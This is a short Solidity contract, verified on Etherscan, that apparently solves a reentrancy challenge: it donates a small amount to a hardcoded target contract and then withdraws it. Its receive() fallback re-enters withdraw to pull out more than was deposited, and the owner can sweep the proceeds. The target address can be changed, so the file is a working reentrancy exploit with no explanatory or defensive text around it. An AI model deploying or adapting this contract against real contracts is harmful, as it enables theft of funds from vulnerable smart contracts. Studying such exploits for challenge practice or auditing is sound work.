/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

pragma solidity 0.8.17;

abstract contract ReentranceContract
{
    function donate(address _to) public payable virtual;
    function withdraw(uint _amount) public virtual;
}

contract ReentranceHelper
{
    ReentranceContract public reentrance = ReentranceContract(address(0x598E150D1091b947Df2543BE00B1E496eDb39051));
    bool public attacked = false;
    address payable owner;

    constructor()
    {
        owner = payable(address(msg.sender));
    }

    function setReentrance(uint160 _address) public
    {
        reentrance = ReentranceContract(address(_address));
    }

    function donate() public payable 
    {
        require(msg.value == 0.001 ether);
        reentrance.donate{ value: 0.001 ether }(address(this));
    }

    function withdraw() public
    {
        reentrance.withdraw(0.001 ether);
    }

    function getMoney() public 
    {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    receive() external payable
    {
        if (!attacked)
        {
            attacked = true;
            reentrance.withdraw(msg.value);
        }
    }
}